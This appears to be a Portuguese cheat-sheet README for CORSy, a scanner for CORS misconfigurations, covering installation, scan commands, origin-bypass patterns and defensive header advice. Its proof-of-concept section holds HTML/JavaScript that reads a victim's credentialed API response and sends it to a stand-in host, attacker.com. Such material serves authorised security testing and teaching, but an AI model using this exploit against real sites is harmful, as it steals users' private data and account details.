<!-- language-home-navigation -->
[🏠 Página Principal Portuguesa](../../README.pt.md) • [🌐 Languages](../../README.md#-available-languages)

[🇹🇷 Türkçe](README.tr.md) • [🇩🇪 Deutsch](README.de.md) • [🇪🇸 Español](README.es.md) • [🇫🇷 Français](README.fr.md)

[🇮🇹 Italiano](README.it.md) • [🇷🇺 Русский](README.ru.md) • [🇨🇳 简体中文](README.zh-CN.md) • [🇸🇦 العربية](README.ar.md) • [🇬🇷 Ελληνικά](README.el.md) • [🇳🇴 Norsk](README.nb.md) • [🇬🇧 English](../README.md)

---


# 🌐 CORSy - Folha de dicas completa

[🇹🇷 Türkçe Sürüm](traduções/README.tr.md)
```
   ██████╗ ██████╗ ██████╗ ███████╗██╗   ██╗
  ██╔════╝██╔═══██╗██╔══██╗██╔════╝╚██╗ ██╔╝
  ██║     ██║   ██║██████╔╝███████╗ ╚████╔╝ 
  ██║     ██║   ██║██╔══██╗╚════██║  ╚██╔╝  
  ╚██████╗╚██████╔╝██║  ██║███████║   ██║   
   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝   ╚═╝   
      Cross-Origin Resource Sharing (CORS) Misconfiguration Scanner
```
<p alinhar="centro">
  <img src="https://img.shields.io/badge/CORSy-CORS_Scanner-blue?style=for-the-badge" alt="CORSy">
  <img src="https://img.shields.io/badge/Author-Somdev_Sangwan-orange?style=for-the-badge" alt="s0md3v">
  <img src="https://img.shields.io/badge/Category-Web_Security_&_API-green?style=for-the-badge" alt="Segurança da Web">
  <img src="https://img.shields.io/badge/License-GPLv3-purple?style=for-the-badge" alt="GPLv3">
</p>

<p alinhar="centro">
  <b>🌐 Ferramenta CLI rápida e abrangente projetada para detectar configurações incorretas de Cross-Origin Resource Sharing (CORS) e testar riscos de roubo de dados de origem cruzada</b>
</p>

---

## 📋 Índice

- [Visão geral e princípios básicos de vulnerabilidade CORS](#-overview--cors-vulnerability-basics)
  - [O Trio Fatal: Reflexão de Origem + Credenciais Verdadeiras](#the-fatal-trio-origin-reflection--credentials-true)
- [Instalação](#-instalação)
- [Verificação básica de alvo](#-basic-target-scanning)
- [Vetores de ataque CORS testados](#-cors-attack-vectors-tested)
  - [Reflexão de origem arbitrária](#reflexão de origem arbitrária)
  - [Confiar na origem nula (`Origin: null`)](#trusting-null-origin-origin-null)
  - [Ignorar Prefixo e Sufixo Regex](#prefix--suffix-regex-bypass)
  - [Confiança de subdomínio curinga](#wildcard-subdomain-trust)
  - [Desvio de caractere especial (`_`, `;`, `!`)](#desvio de caractere especial----)
- [Verificação de múltiplos alvos e exportação de saída](#-varredura de vários alvos--exportação de saída)
- [Elaboração de explorações de prova de conceito (PoC)](#-crafting-proof-of-concept-poc-exploits)
- [Tabela de referência rápida](#-tabela de referência rápida)
- [Considerações defensivas e cabeçalhos seguros](#-considerações defensivas--cabeçalhos seguros)
- [Isenção de responsabilidade legal](#-isenção de responsabilidade legal)

---

## 🎯 Visão geral e princípios básicos de vulnerabilidade CORS

**Compartilhamento de recursos entre origens (CORS)** é um mecanismo de segurança do navegador que permite que os servidores da Web relaxem a **Política de mesma origem (SOP)**. Ao retornar cabeçalhos como:
-`Access-Control-Allow-Origin: <origin>`
-`Access-Control-Allow-Credentials: true`

Um aplicativo da web concede permissão a outros sites para ler suas respostas HTTP em nome do usuário vítima.

### O Trio Fatal: Reflexão da Origem + Credenciais Verdadeiras
Quando um aplicativo reflete cegamente o cabeçalho `Origin` recebido em `Access-Control-Allow-Origin` e habilita `Access-Control-Allow-Credentials: true`, qualquer site malicioso pode forçar o navegador de um visitante autenticado a ler mensagens privadas, chaves de API e detalhes da conta.

Criado por **Somdev Sangwan (s0md3v)**, **CORSy** investiga sistematicamente endpoints com mais de 16 permutações de origem conhecidas para detectar essas configurações incorretas.

---

## 📥 Instalação
```bash
# Clone the repository
git clone https://github.com/s0md3v/Corsy.git
cd Corsy

# Install dependencies
pip install -r requirements.txt

# Run Corsy
python3 corsy.py -h
```
---

## 🚀 Varredura básica de alvo

Digitalize um único endpoint de aplicativo web:
```bash
python3 corsy.py -u https://target.com/api/user/details
```
Adicione cabeçalhos personalizados ou cookies de sessão:
```bash
python3 corsy.py -u https://target.com/api/user/details \
  --headers "Cookie: session=abc123xyz"
```
---

## ⚡ Vetores de ataque CORS testados

O CORSy testa automaticamente vários padrões de permutação de origem:

### Reflexão de origem arbitrária
O servidor espelha cegamente qualquer domínio:
```http
Request:
Origin: https://evil.com

Response:
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Credentials: true
```
### Confiando na origem nula (`Origin: null`)
Os aplicativos podem confiar nas origens `null` (comuns com iframes locais em sandbox ou URLs `data:`):
```http
Request:
Origin: null

Response:
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```
*Pode ser acionado carregando a API da vítima a partir de um iframe com `sandbox="allow-scripts allow-top-navigation"`.*

### Ignorar Prefixo e Sufixo Regex
Validação de regex deficiente (por exemplo, `.*target.com` ou `target.com.*`):
-`https://target.com.attacker.com`
-`https://not-target.com`

### Ignorar caracteres especiais (`_`, `;`, `!`)
Navegadores e servidores lidam com delimitadores de URI de maneira diferente:
-`https://target.com_.attacker.com`
-`https://target.com%60.attacker.com`

---

## 🌐 Verificação multialvo e exportação de saída

Digitalize grandes listas de endpoints de API descobertos no reconhecimento:
```bash
# Scan a list of URLs with 10 concurrent threads
python3 corsy.py -i endpoints.txt -t 10

# Export results to clean JSON format
python3 corsy.py -i endpoints.txt -o cors_results.json
```
---

## 💻 Elaboração de explorações de prova de conceito (PoC)

Quando o CORSy confirmar uma configuração incorreta com credenciais permitidas, gere uma exploração HTML para roubar dados confidenciais:
```html
<!DOCTYPE html>
<html>
<body>
<h1>CORS Exploit Demo</h1>
<script>
    var req = new XMLHttpRequest();
    req.onload = function() {
        // Exfiltrate stolen private response to attacker server
        fetch("https://attacker.com/log?data=" + encodeURIComponent(this.responseText));
    };
    req.open("GET", "https://target.com/api/user/private_data", true);
    req.withCredentials = true; // Crucial for sending session cookies
    req.send();
</script>
</body>
</html>
```
---

## ⚡ Tabela de referência rápida

| Objetivo | Comando |
|-----------|---------|
| **Verificar URL único** | `python3 corsy.py -u <URL>` |
| **Verificar com cookie de sessão** | `python3 corsy.py -u <URL> --headers "Cookie: sess=123"` |
| **Lista de URLs de verificação** | `python3 corsy.py -i targets.txt` |
| **Verificação multithread** | `python3 corsy.py -i targets.txt -t 20` |
| **Exportar para JSON** | `python3 corsy.py -i targets.txt -o results.json` |

---

## 🛡️ Considerações defensivas e cabeceios seguros

1. **Nunca reflita a origem arbitrariamente:** Compare o cabeçalho `Origin` com uma lista de permissões explícita e estrita do lado do servidor.
2. **Nunca emparelhar curinga com credenciais:** O navegador bloqueia `Access-Control-Allow-Origin: *` com `Credentials: true`, mas nunca emula-o dinamicamente.
3. **Evite confiar em `null`:** Não adicione `null` a políticas de origem confiável.

---

## ⚠️ Isenção de responsabilidade legal

> [!CUIDADO]
> O CORSy destina-se estritamente a avaliações de segurança autorizadas, testes de penetração e auditoria defensiva. Testar sites sem autorização é ilegal.